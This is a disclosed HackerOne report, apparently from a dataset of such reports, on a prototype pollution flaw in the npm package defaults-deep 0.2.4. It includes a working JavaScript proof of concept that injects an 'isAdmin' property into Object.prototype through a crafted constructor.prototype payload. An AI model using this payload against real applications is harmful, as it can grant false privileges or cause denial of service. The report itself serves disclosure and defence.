---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '380878'
original_report_id: '380878'
title: Prototype pollution attack (defaults-deep / constructor.prototype)
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2018-07-12T08:43:07.767Z'
disclosed_at: '2018-09-28T10:03:21.371Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
asset_identifier: defaults-deep
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Prototype pollution attack (defaults-deep / constructor.prototype)

## Metadata

- HackerOne Report ID: 380878
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2018-09-28T10:03:21.371Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a prototype pollution vulnerability in defaults-deep.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** defaults-deep
**version:** 0.2.4
**npm page:** `https://www.npmjs.com/package/defaults-deep`

## Module Description

Like `extend` but recursively copies only the missing properties/values to the target object.

## Module Stats

6,659 downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The `defaults-deep` package can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` and send it to `defaults-deep`:

```javascript
var defaultsDeep = require('defaults-deep');
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
defaultsDeep({}, payload);
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
